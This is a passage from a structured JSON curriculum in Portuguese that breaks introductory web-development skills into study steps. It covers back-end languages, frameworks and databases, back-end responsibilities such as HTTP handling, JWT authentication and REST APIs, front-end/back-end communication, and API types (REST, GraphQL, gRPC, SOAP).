                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o conceito de Back-end e listar linguagens principais",
                                  "subSteps": [
                                    "Defina o que é back-end em aplicações web (lógica de servidor, processamento de dados, APIs).",
                                    "Pesquise as linguagens mais usadas: JavaScript (Node.js), Python, Java, PHP, Ruby.",
                                    "Crie uma lista inicial com 5 linguagens principais e suas características básicas (ex: Node.js é assíncrono).",
                                    "Identifique popularidade via fontes como Stack Overflow Survey ou GitHub Octoverse.",
                                    "Anote exemplos de uso real para cada linguagem."
                                  ],
                                  "verification": "Lista completa com 5 linguagens, descrições curtas e fontes citadas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Stack Overflow Developer Survey",
                                    "GitHub Octoverse reports",
                                    "Notebook ou editor de texto"
                                  ],
                                  "tips": "Use tabelas para organizar: coluna Linguagem | Vantagens | Desvantagens.",
                                  "learningObjective": "Compreender o papel do back-end e identificar linguagens principais usadas no desenvolvimento.",
                                  "commonMistakes": [
                                    "Confundir linguagens front-end (JS no browser) com back-end (Node.js)",
                                    "Ignorar métricas de popularidade atuais",
                                    "Listar apenas uma linguagem sem contexto"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar frameworks para linguagens de back-end",
                                  "subSteps": [
                                    "Estude Node.js: runtime JS para servidor, com frameworks como Express.js para APIs.",
                                    "Analise Python: frameworks Django (full-stack) e Flask (leve) para web apps.",
                                    "Descreva Java com Spring Boot: para apps empresariais escaláveis.",
                                    "Revise PHP com Laravel: para desenvolvimento rápido de sites dinâmicos.",
                                    "Compare frameworks: leveza, comunidade, curva de aprendizado."
                                  ],
                                  "verification": "Tabela comparativa com 4 frameworks, incluindo prós/contras e casos de uso.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Documentação oficial: nodejs.org, django-project.com, spring.io, laravel.com",
                                    "Vídeos introdutórios no YouTube (5-10 min cada)",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": "Instale um Hello World rápido de cada (sem código profundo) para visualizar estrutura.",
                                  "learningObjective": "Descrever frameworks comuns e suas aplicações em projetos back-end.",
                                  "commonMistakes": [
                                    "Confundir framework com linguagem",
                                    "Não mencionar ecossistema (ex: NPM para Node)",
                                    "Ignorar atualizações recentes de frameworks"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e descrever bancos de dados para back-end",
                                  "subSteps": [
                                    "Explique bancos relacionais: MySQL (SQL, tabelas relacionais, ACID).",
                                    "Descreva NoSQL: MongoDB (documentos JSON, escalável, flexível).",
                                    "Liste outros: PostgreSQL (relacional avançado), Redis (cache/key-value).",
                                    "Entenda integração: ORMs como Sequelize (Node), SQLAlchemy (Python).",
                                    "Crie diagrama simples de app back-end conectando a DB."
                                  ],
                                  "verification": "Descrições de 4 DBs com tipos (SQL/NoSQL) e exemplos de queries básicas.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Documentação MySQL e MongoDB",
                                    "DB-Fiddle ou playgrounds online",
                                    "Ferramenta de diagrama como Draw.io"
                                  ],
                                  "tips": "Teste uma query simples em playgrounds online para fixar conceitos.",
                                  "learningObjective": "Reconhecer bancos de dados essenciais e seu papel no back-end.",
                                  "commonMistakes": [
                                    "Achar que todos DBs são iguais",
                                    "Não diferenciar SQL vs NoSQL",
                                    "Esquecer integrações com linguagens back-end"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar tecnologias e sintetizar conhecimentos",
                                  "subSteps": [
                                    "Crie matriz comparativa: Linguagem | Framework | DB comum | Uso ideal.",
                                    "Discuta escolhas: Node para real-time, Java para enterprise, Python para data.",
                                    "Pesquise cases: Netflix (Node), Instagram (Django), etc.",
                                    "Identifique tendências: serverless (AWS Lambda), microservices.",
                                    "Resuma em mindmap ou infográfico."
                                  ],
                                  "verification": "Matriz comparativa completa e resumo de 1 página com tendências.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Ferramentas: Google Sheets para matriz, Canva para infográfico",
                                    "Sites: towardsdatascience.com, dev.to"
                                  ],
                                  "tips": "Pergunte: 'Qual tech para um e-commerce?' para praticar decisões.",
                                  "learningObjective": "Comparar tecnologias back-end e aplicar em cenários reais.",
                                  "commonMistakes": [
                                    "Focar só em popularidade sem contexto de uso",
                                    "Não considerar performance/escalabilidade",
                                    "Ignorar evolução (ex: Deno vs Node)"
                                  ]
                                }
                              ],
                              "practicalExample": "Para um blog pessoal, identifique: Node.js + Express + MongoDB (rápido para CRUD de posts); ou Python + Django + PostgreSQL (robusto com admin pronto). Crie tabela comparando tempo de setup e escalabilidade.",
                              "finalVerifications": [
                                "Lista precisa de 5+ linguagens back-end com descrições.",
                                "Explicação de 4 frameworks principais e seus casos de uso.",
                                "Diferenciação clara entre MySQL (relacional) e MongoDB (NoSQL).",
                                "Matriz comparativa funcional com pelo menos 4 tecnologias.",
                                "Identificação de 3 tendências atuais (ex: serverless, GraphQL).",
                                "Exemplo prático de stack completo (Linguagem + Framework + DB)."
                              ],
                              "assessmentCriteria": [
                                "Precisão e atualidade das informações (fontes citadas: 80%+).",
                                "Profundidade nas descrições (prós/contras, integrações: 4+ pontos por tech).",
                                "Organização visual (tabelas, diagramas: claros e legíveis).",
                                "Capacidade de comparação e aplicação contextual.",
                                "Completude da matriz e verificações finais atendidas.",
                                "Criatividade em exemplos reais e conexões práticas."
                              ],
                              "crossCurricularConnections": [
                                "Front-end: Integração via APIs REST/GraphQL.",
                                "Banco de Dados: Modelagem e queries SQL/NoSQL.",
                                "Segurança da Informação: Autenticação (JWT em Node) e OWASP top 10.",
                                "Gestão de Projetos: Escolha de stack em metodologias Ágeis.",
                                "Análise de Dados: Python back-end com ML (Flask + Scikit-learn)."
                              ],
                              "realWorldApplication": "Em startups como Uber (Node.js para APIs em tempo real) ou bancos (Java Spring para transações seguras), identificar techs permite escolher stacks eficientes, reduzindo tempo de desenvolvimento em 30-50% e melhorando escalabilidade."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.2.3",
                            "name": "Descrever responsabilidades do Back-end",
                            "description": "Detalhar as funções do back-end, incluindo tratamento de requisições HTTP, validação de dados, autenticação (ex.: JWT), integração com bancos de dados e exposição de APIs RESTful.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender as responsabilidades gerais do back-end",
                                  "subSteps": [
                                    "Defina o que é back-end em uma aplicação web.",
                                    "Liste as principais camadas de uma arquitetura back-end (lógica de negócios, persistência de dados, APIs).",
                                    "Identifique como o back-end se diferencia do front-end.",
                                    "Descreva o papel do back-end na comunicação cliente-servidor.",
                                    "Exemplifique com um diagrama simples de fluxo de dados."
                                  ],
                                  "verification": "Escreva um parágrafo resumindo as responsabilidades gerais e valide com um colega ou ferramenta de correção.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação de arquitetura web (MDN, freeCodeCamp), papel e caneta para diagrama.",
                                  "tips": "Use analogias como 'cozinha de um restaurante' para o back-end processar pedidos.",
                                  "learningObjective": "Compreender o escopo amplo das funções do back-end.",
                                  "commonMistakes": "Confundir back-end com front-end ou ignorar a separação de responsabilidades."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Descrever tratamento de requisições HTTP e validação de dados",
                                  "subSteps": [
                                    "Explique métodos HTTP (GET, POST, PUT, DELETE) e seu uso no back-end.",
                                    "Descreva o ciclo de vida de uma requisição: recebimento, processamento e resposta.",
                                    "Detalhe técnicas de validação de dados (schemas, middlewares).",
                                    "Implemente um exemplo simples de validação em pseudocódigo.",
                                    "Discuta status codes HTTP apropriados para respostas."
                                  ],
                                  "verification": "Crie um fluxograma de uma requisição HTTP com validação e teste com cenários de erro.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Referências HTTP (RFC 2616), editores de código como VS Code.",
                                  "tips": "Sempre valide entrada para prevenir injeções SQL ou XSS.",
                                  "learningObjective": "Dominar o processamento seguro de requisições e dados.",
                                  "commonMistakes": "Esquecer validação de entrada ou usar status codes incorretos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explicar autenticação e autorização com JWT",
                                  "subSteps": [
                                    "Defina autenticação vs. autorização.",
                                    "Descreva o fluxo JWT: geração, assinatura, verificação.",
                                    "Liste componentes de um token JWT (header, payload, signature).",
                                    "Exponha riscos de autenticação stateless e como mitigar.",
                                    "Simule um middleware de autenticação em pseudocódigo."
                                  ],
                                  "verification": "Gere um token JWT manualmente e valide sua decodificação em jwt.io.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Site jwt.io, documentação Node.js/Express ou similar.",
                                  "tips": "Mantenha chaves secretas seguras e use HTTPS em produção.",
                                  "learningObjective": "Entender mecanismos de segurança para acesso protegido.",
                                  "commonMistakes": "Expor tokens em logs ou não expirar sessões."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Detalhar integração com bancos de dados",
                                  "subSteps": [
                                    "Compare bancos relacionais (SQL) vs. NoSQL e escolha adequada.",
                                    "Descreva ORMs (ex.: Sequelize, Mongoose) para abstração.",
                                    "Explique operações CRUD no back-end com queries seguras.",
                                    "Discuta padrões como migrations e seeding.",
                                    "Otimize queries para performance (indexação, caching)."
                                  ],
                                  "verification": "Escreva queries CRUD para um schema simples e execute em um banco local (SQLite).",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Ferramentas como MySQL Workbench, PostgreSQL ou MongoDB Compass.",
                                  "tips": "Use prepared statements para evitar SQL injection.",
                                  "learningObjective": "Conhecer persistência de dados de forma eficiente e segura.",
                                  "commonMistakes": "Queries não parametrizadas ou esquecimento de transações."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Descrever exposição de APIs RESTful",
                                  "subSteps": [
                                    "Defina princípios REST (stateless, recursos, HATEOAS).",
                                    "Estruture endpoints com convenções (ex.: /users/:id).",
                                    "Implemente versionamento de API e documentação (Swagger).",
                                    "Teste APIs com ferramentas como Postman.",
                                    "Discuta rate limiting e CORS."
                                  ],
                                  "verification": "Crie uma especificação OpenAPI para 3 endpoints e valide com um cliente HTTP.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Postman, Swagger Editor.",
                                  "tips": "Siga o padrão JSON para respostas consistentes.",
                                  "learningObjective": "Projetar APIs escaláveis e utilizáveis.",
                                  "commonMistakes": "Endpoints inconsistentes ou ignorar documentação."
                                }
                              ],
                              "practicalExample": "Em um e-commerce, o back-end recebe uma requisição POST /orders com dados do carrinho, valida itens e quantidades, autentica o usuário via JWT, salva no banco PostgreSQL via ORM, e retorna um JSON com o ID do pedido e status 201 Created.",
                              "finalVerifications": [
                                "Descreva verbalmente todas as responsabilidades em 2 minutos sem consultar notas.",
                                "Crie um diagrama completo de arquitetura back-end para uma app simples.",
                                "Responda a 5 perguntas sobre cenários de erro (ex.: token inválido).",
                                "Compare back-end com front-end em uma tabela.",
                                "Implemente um endpoint mock com validação e autenticação.",
                                "Explique integrações para um projeto real como rede social."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de cada responsabilidade (90% cobertura).",
                                "Uso correto de termos técnicos (HTTP, JWT, REST, CRUD).",
                                "Inclusão de exemplos práticos e fluxos lógicos.",
                                "Demonstração de segurança e melhores práticas.",
                                "Clareza e estrutura na explicação escrita/oral.",
                                "Capacidade de conectar conceitos em cenários reais."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos HTTP e segurança de rede.",
                                "Banco de Dados: Modelagem e queries SQL/NoSQL.",
                                "Segurança da Informação: Autenticação, criptografia JWT.",
                                "Desenvolvimento Ágil: Integração CI/CD para back-end.",
                                "Administração: Escalabilidade e performance de servidores."
                              ],
                              "realWorldApplication": "Em empresas como Netflix ou Uber, o back-end gerencia milhões de requisições diárias, valida dados de usuários, autentica via JWT, persiste em bancos distribuídos como Cassandra, e expõe APIs REST para apps mobile/web, garantindo alta disponibilidade e segurança."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.2.4",
                            "name": "Explicar a interação Front-end e Back-end",
                            "description": "Descrever como o front-end e o back-end se comunicam por meio de protocolos como HTTP/HTTPS, utilizando requisições (GET, POST) e respostas em JSON, considerando conceitos de arquitetura cliente-servidor.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Arquitetura Cliente-Servidor",
                                  "subSteps": [
                                    "Defina o conceito de cliente e servidor em aplicações web.",
                                    "Identifique o papel do cliente (navegador ou app front-end) como requisitor de dados.",
                                    "Explique o servidor como provedor de recursos e processamento.",
                                    "Desenhe um diagrama simples mostrando cliente enviando requisição e servidor respondendo.",
                                    "Diferencie comunicação síncrona e assíncrona básica."
                                  ],
                                  "verification": "Crie um diagrama hand-drawn ou digital da arquitetura cliente-servidor e explique verbalmente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Papel e caneta ou ferramenta como Draw.io",
                                    "Vídeo introdutório sobre cliente-servidor (ex: freeCodeCamp)"
                                  ],
                                  "tips": "Use analogia de restaurante: cliente pede, servidor cozinha e entrega.",
                                  "learningObjective": "Entender os papéis fundamentais na arquitetura cliente-servidor.",
                                  "commonMistakes": [
                                    "Confundir cliente com servidor",
                                    "Ignorar a rede como mediadora"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Front-end e Back-end",
                                  "subSteps": [
                                    "Descreva o front-end como camada de interface do usuário (HTML, CSS, JS).",
                                    "Explique o back-end como lógica de servidor, banco de dados e APIs (Node.js, Python, etc.).",
                                    "Compare responsabilidades: front-end gerencia UI/UX, back-end gerencia dados e segurança.",
                                    "Liste exemplos de tecnologias para cada lado.",
                                    "Identifique a separação de concerns (princípio de responsabilidade única)."
                                  ],
                                  "verification": "Escreva uma tabela comparativa com 5 diferenças entre front-end e back-end.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Editor de texto ou Google Docs",
                                    "Infográfico sobre stack MERN/MEAN"
                                  ],
                                  "tips": "Pense no front-end como 'o que o usuário vê', back-end como 'o que acontece por trás'.",
                                  "learningObjective": "Diferenciar claramente front-end e back-end em termos de funções e tecnologias.",
                                  "commonMistakes": [
                                    "Achar que front-end processa dados sensíveis",
                                    "Confundir front-end com design apenas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Protocolos HTTP/HTTPS e Métodos de Requisição",
                                  "subSteps": [
                                    "Explique HTTP como protocolo stateless para comunicação web.",
                                    "Descreva HTTPS como versão segura com SSL/TLS.",
                                    "Detalhe métodos: GET (buscar dados), POST (enviar dados).",
                                    "Simule uma requisição GET no navegador (DevTools).",
                                    "Discuta status codes comuns (200 OK, 404 Not Found, 500 Error)."
                                  ],
                                  "verification": "Abra DevTools no navegador, faça uma requisição GET a um site e anote headers e response.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Navegador com DevTools (Chrome/Firefox)",
                                    "Postman para testes opcionais"
                                  ],
                                  "tips": "Sempre cheque HTTPS em produção para segurança de dados.",
                                  "learningObjective": "Dominar os protocolos e métodos básicos de comunicação entre front e back.",
                                  "commonMistakes": [
                                    "Usar POST para buscas simples (use GET)",
                                    "Ignorar status codes nas respostas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Descrever Fluxo de Comunicação com JSON",
                                  "subSteps": [
                                    "Explique JSON como formato leve para troca de dados (chave-valor).",
                                    "Descreva fluxo: Front envia requisição HTTP -> Back processa -> Responde JSON.",
                                    "Simule com fetch() ou Axios: GET lista de usuários, POST novo usuário.",
                                    "Parseie JSON no front-end e renderize na UI.",
                                    "Aborde CORS como consideração para origens diferentes."
                                  ],
                                  "verification": "Escreva pseudocódigo de uma requisição front-back completa e teste em CodePen.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "CodePen ou JSFiddle",
                                    "Documentação MDN sobre Fetch API"
                                  ],
                                  "tips": "Valide JSON sempre para evitar erros de parsing.",
                                  "learningObjective": "Mapear o fluxo completo de interação usando JSON via HTTP.",
                                  "commonMistakes": [
                                    "Não tratar erros de rede",
                                    "Esquecer async/await em JS"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie uma página web simples onde o front-end (HTML/JS) faz uma requisição GET para um back-end mock (JSONPlaceholder) listando posts, e um POST para adicionar um novo post, exibindo os dados em uma tabela dinâmica.",
                              "finalVerifications": [
                                "Diagramar corretamente o fluxo cliente-servidor com front/back.",
                                "Explicar diferença entre GET e POST com exemplos reais.",
                                "Identificar JSON em uma resposta de API via DevTools.",
                                "Simular uma comunicação completa sem erros.",
                                "Discutir impacto de HTTPS em segurança.",
                                "Listar 3 status codes e seus significados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de protocolos e métodos (80% correto).",
                                "Clareza no diagrama de fluxo de comunicação.",
                                "Capacidade de simular requisição prática sem erros.",
                                "Uso correto de termos técnicos (JSON, HTTP, cliente-servidor).",
                                "Identificação de erros comuns e soluções.",
                                "Conexão lógica entre conceitos front/back."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos TCP/IP subjacentes ao HTTP.",
                                "Segurança da Informação: Autenticação e criptografia em HTTPS.",
                                "Banco de Dados: Processamento de queries no back-end.",
                                "Design de UX/UI: Impacto da latência de comunicação na experiência usuário."
                              ],
                              "realWorldApplication": "Em e-commerces como Amazon, o front-end exibe produtos via GET JSON do back-end; ao adicionar ao carrinho, POST atualiza o servidor, garantindo sincronia em tempo real para milhões de usuários."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.1.1",
                              "10.1.1.4.2.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.5",
                    "name": "APIs e Serviços Web",
                    "description": "Interfaces para integração e troca de dados entre aplicações distribuídas.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.5.1",
                        "name": "Application Programming Interfaces (APIs)",
                        "description": "Interfaces de programação de aplicações que definem como software componentes interagem, permitindo a integração e troca de dados entre sistemas distribuídos na Internet.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.5.1.1",
                            "name": "Definir o conceito de API",
                            "description": "Explicar o que é uma API, seus componentes principais (endpoints, métodos, parâmetros) e sua função como camada de abstração para comunicação entre aplicações.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a definição básica de API",
                                  "subSteps": [
                                    "Pesquise a definição oficial de API (Application Programming Interface).",
                                    "Analise a analogia clássica: API como um garçom em um restaurante, mediando pedidos entre cliente e cozinha.",
                                    "Identifique a diferença entre API e interface de usuário (UI).",
                                    "Liste 3 exemplos cotidianos de APIs (ex: Google Maps em apps, pagamento via Stripe).",
                                    "Registre em um diagrama simples: cliente → API → servidor."
                                  ],
                                  "verification": "Escreva uma definição em suas próprias palavras e compartilhe com um colega para validação.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Caderno ou editor de texto",
                                    "Vídeo explicativo sobre APIs (ex: YouTube 'O que é API')"
                                  ],
                                  "tips": "Use analogias do dia a dia para fixar o conceito abstrato.",
                                  "learningObjective": "Entender API como intermediário padronizado para comunicação entre softwares.",
                                  "commonMistakes": [
                                    "Confundir API com banco de dados",
                                    "Pensar que API é só para web",
                                    "Ignorar o aspecto de abstração"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar os endpoints como endereços principais",
                                  "subSteps": [
                                    "Defina endpoint como uma URL específica que representa um recurso (ex: /users para lista de usuários).",
                                    "Estude a estrutura de um endpoint: protocolo (https://), domínio, caminho e query params.",
                                    "Crie exemplos de endpoints fictícios para uma API de livros (/books, /books/123).",
                                    "Diferencie endpoints RESTful (recursos nomeados) de endpoints RPC (ações nomeadas).",
                                    "Desenhe um mapa de endpoints para uma API de e-commerce simples."
                                  ],
                                  "verification": "Liste 5 endpoints válidos para uma API de gerenciamento de tarefas e explique cada um.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação de API pública (ex: JSONPlaceholder)",
                                    "Ferramenta de desenho como Draw.io",
                                    "Navegador web"
                                  ],
                                  "tips": "Sempre teste endpoints reais em ferramentas como Postman para visualizar.",
                                  "learningObjective": "Identificar e construir endpoints como pontos de acesso a recursos.",
                                  "commonMistakes": [
                                    "Confundir endpoint com método HTTP",
                                    "Usar espaços ou caracteres inválidos em caminhos",
                                    "Ignorar a hierarquia de recursos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar métodos HTTP e parâmetros",
                                  "subSteps": [
                                    "Liste os principais métodos HTTP: GET (ler), POST (criar), PUT/PATCH (atualizar), DELETE (remover).",
                                    "Explique parâmetros: query strings (?id=123), path params (/users/123), body (JSON no POST).",
                                    "Simule requisições com exemplos: GET /users?id=1 vs POST /users com body {name: 'João'}.",
                                    "Estude headers como Content-Type e Authorization.",
                                    "Pratique identificando método e params em uma requisição real."
                                  ],
                                  "verification": "Descreva uma operação CRUD usando métodos corretos com parâmetros para uma entidade 'produto'.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Postman ou Insomnia",
                                    "Documentação HTTP methods (MDN Web Docs)",
                                    "API teste como ReqRes.in"
                                  ],
                                  "tips": "Lembre: GET é idempotente e sem body; POST pode ter side-effects.",
                                  "learningObjective": "Dominar como métodos e parâmetros definem ações e dados em APIs.",
                                  "commonMistakes": [
                                    "Usar GET para dados sensíveis",
                                    "Esquecer Content-Type no body JSON",
                                    "Misturar path e query params"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Entender a API como camada de abstração para comunicação",
                                  "subSteps": [
                                    "Defina abstração: API esconde complexidade interna, expondo apenas o necessário.",
                                    "Compare comunicação direta (socket raw) vs via API (padronizada e segura).",
                                    "Analise fluxograma: App A chama API → App B responde sem conhecer implementação interna.",
                                    "Discuta benefícios: desacoplamento, escalabilidade, reutilização.",
                                    "Crie um exemplo de como uma API de pagamento abstrai o processamento bancário."
                                  ],
                                  "verification": "Explique em um parágrafo como API permite comunicação entre apps sem dependência direta.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Vídeo sobre arquitetura de microsserviços",
                                    "Papel e caneta para fluxogramas",
                                    "Artigo sobre REST vs SOAP"
                                  ],
                                  "tips": "Pense em APIs como contratos: define o que, não o como.",
                                  "learningObjective": "Compreender o papel da API na integração e abstração entre aplicações.",
                                  "commonMistakes": [
                                    "Ver API só como 'chamada HTTP'",
                                    "Subestimar segurança na abstração",
                                    "Confundir com middleware"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando a API pública JSONPlaceholder (jsonplaceholder.typicode.com): Faça uma requisição GET para /posts/1 (endpoint com path param), observe o método GET idempotente, parâmetros na URL e resposta JSON. Em seguida, POST /posts com body {title: 'Meu Post', body: 'Conteúdo', userId: 1}, verificando como a API abstrai a criação sem expor o banco de dados.",
                              "finalVerifications": [
                                "Defina API corretamente, incluindo abstração e comunicação.",
                                "Liste e explique 4 componentes principais (endpoints, métodos, parâmetros, headers).",
                                "Diferencie API de UI e banco de dados.",
                                "Crie um endpoint fictício com método e parâmetros para CRUD.",
                                "Explique benefícios da abstração em um cenário real.",
                                "Simule uma requisição completa em ferramenta como Postman."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição de API e componentes (endpoints, métodos, parâmetros).",
                                "Uso correto de analogias e exemplos práticos.",
                                "Compreensão da abstração e comunicação entre aplicações.",
                                "Capacidade de criar e validar requisições simuladas.",
                                "Identificação de erros comuns em conceitos.",
                                "Clareza na explicação oral ou escrita."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos HTTP e comunicação cliente-servidor.",
                                "Programação: Integração de código com chamadas assíncronas (fetch/axios).",
                                "Administração: Modelos de negócios baseados em APIs (SaaS, integrações).",
                                "Segurança da Informação: Autenticação OAuth e rate limiting em APIs.",
                                "Inglês Técnico: Leitura de documentações API em inglês."
                              ],
                              "realWorldApplication": "No e-commerce como Mercado Livre, APIs permitem que apps móveis chamem serviços de pagamento (ex: Mercado Pago), estoque e frete sem recriar lógica interna, garantindo integração rápida, escalável e segura entre sistemas heterogêneos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.1.2",
                            "name": "Identificar tipos de APIs",
                            "description": "Diferenciar APIs RESTful, GraphQL, gRPC e APIs tradicionais, destacando casos de uso em aplicações web e móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender APIs Tradicionais e Conceitos Básicos",
                                  "subSteps": [
                                    "Defina o que é uma API e sua função em integrações de software.",
                                    "Estude APIs tradicionais baseadas em SOAP, incluindo XML e WSDL.",
                                    "Identifique limitações como verbosidade e overhead de processamento.",
                                    "Pesquise exemplos históricos como serviços web enterprise.",
                                    "Anote diferenças iniciais com abordagens modernas."
                                  ],
                                  "verification": "Crie um resumo de 1 parágrafo explicando APIs tradicionais e liste 3 limitações.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação W3C SOAP",
                                    "Artigo 'SOAP vs REST' no Medium"
                                  ],
                                  "tips": "Use analogias como 'carta formal' para SOAP vs 'mensagem rápida' para modernas.",
                                  "learningObjective": "Compreender origens e limitações de APIs tradicionais.",
                                  "commonMistakes": "Confundir APIs tradicionais apenas com RPC sem mencionar SOAP."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar APIs RESTful",
                                  "subSteps": [
                                    "Aprenda princípios REST: stateless, recursos URI, métodos HTTP (GET, POST, PUT, DELETE).",
                                    "Estude JSON como formato padrão e status codes (200, 404, etc.).",
                                    "Analise HATEOAS e cacheabilidade.",
                                    "Examine casos de uso em apps web como CRUD operations.",
                                    "Teste uma API REST pública como JSONPlaceholder."
                                  ],
                                  "verification": "Descreva um fluxo GET/POST em uma API REST com exemplo de endpoint.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação oficial REST (Fielding thesis)",
                                    "Postman para testes",
                                    "JSONPlaceholder.io"
                                  ],
                                  "tips": "Pense em REST como 'biblioteca de livros' onde URIs são prateleiras.",
                                  "learningObjective": "Dominar características e casos de uso de REST em web/mobile.",
                                  "commonMistakes": "Ignorar statelessness e tratar como sessões stateful."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Investigar GraphQL",
                                  "subSteps": [
                                    "Entenda schema-first, queries/mutations/subscriptions.",
                                    "Compare over/under-fetching vs REST.",
                                    "Estude resolvers e tipos (Query, Mutation, Object).",
                                    "Veja integrações com React Native para mobile.",
                                    "Teste GraphQL em playground como GitHub API."
                                  ],
                                  "verification": "Escreva uma query GraphQL simples para buscar usuário e posts.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação GraphQL.org",
                                    "GraphQL Playground",
                                    "GitHub GraphQL Explorer"
                                  ],
                                  "tips": "GraphQL é como 'cardápio personalizado' vs 'menu fixo' do REST.",
                                  "learningObjective": "Diferenciar GraphQL por flexibilidade em dados para apps dinâmicos.",
                                  "commonMistakes": "Confundir subscriptions com WebSockets sem contexto GraphQL."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar gRPC",
                                  "subSteps": [
                                    "Aprenda Protocol Buffers (protobuf) e HTTP/2 base.",
                                    "Estude stubs cliente/servidor e streaming (unary, server/client/bidirectional).",
                                    "Compare performance com REST em microservices.",
                                    "Identifique casos em mobile como apps de alta performance (ex: Android/iOS).",
                                    "Gere um proto simples e teste com grpcweb."
                                  ],
                                  "verification": "Liste 3 diferenças de gRPC vs REST e um caso de uso em mobile.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação gRPC.io",
                                    "Protobuf compiler",
                                    "grpcweb para browser"
                                  ],
                                  "tips": "gRPC é 'telefone de alta velocidade' para comunicações binárias rápidas.",
                                  "learningObjective": "Reconhecer gRPC para cenários de baixa latência.",
                                  "commonMistakes": "Achar gRPC só para linguagens Google, ignorando multi-lang support."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Comparar Tipos e Destacar Casos de Uso",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: formato, performance, flexibilidade, escalabilidade.",
                                    "Mapeie casos: REST para web simples, GraphQL para mobile data-heavy, gRPC para microservices, tradicionais para legacy.",
                                    "Discuta trade-offs em apps web/mobile híbridos.",
                                    "Simule escolha de API para um app de delivery.",
                                    "Revise tabela com exemplos reais (ex: Stripe REST, Facebook GraphQL)."
                                  ],
                                  "verification": "Preencha tabela comparativa e justifique escolha para 2 cenários web/mobile.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Google Sheets/Excel para tabela",
                                    "Artigos 'API Comparison' no Towards Data Science"
                                  ],
                                  "tips": "Priorize por contexto: simplicidade (REST) vs eficiência (gRPC).",
                                  "learningObjective": "Diferenciar e selecionar APIs por casos de uso práticos.",
                                  "commonMistakes": "Generalizar um tipo como 'melhor' sem contexto específico."
                                }
                              ],
                              "practicalExample": "Em um app de e-commerce mobile como o Mercado Livre: Use REST para listagem de produtos (simples CRUD), GraphQL para dashboard personalizado do usuário (evita over-fetching), gRPC para pagamentos em tempo real entre microservices, e evite tradicionais por lentidão em mobile.",
                              "finalVerifications": [
                                "Explique diferenças chave entre REST e GraphQL com exemplo de query.",
                                "Liste 3 casos de uso para gRPC em apps móveis.",
                                "Identifique limitações de APIs tradicionais em cenários modernos.",
